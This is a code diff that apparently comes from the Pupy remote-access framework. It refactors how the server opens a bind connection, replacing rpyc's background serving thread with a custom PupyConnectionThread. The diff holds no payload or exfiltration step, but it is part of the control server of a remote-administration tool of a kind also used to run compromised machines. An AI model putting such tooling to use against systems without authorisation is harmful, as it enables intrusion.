@@ -24,6 +24,7 @@ from .PupyJob import PupyJob
 from .PupyCmd import color_real
 from .PupyCategories import PupyCategories
 from network.conf import transports
+from network.lib.connection import PupyConnectionThread
 from pupylib.utils.rpyc_utils import obtain
 from .PupyTriggers import on_connect
 from network.lib.utils import parse_transports_args
@@ -271,10 +272,8 @@ class PupyServer(threading.Thread):
             return
         stream=launcher.iterate().next()
         self.handler.display_info("Connecting ...")
-        conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
-        bgsrv=rpyc.BgServingThread(conn)
-        bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...
-
+        bgsrv=PupyConnectionThread(PupyService.PupyBindService, rpyc.Channel(stream), config={})
+        bgsrv.start()
 
     def run(self):
         self.handler_registered.wait()
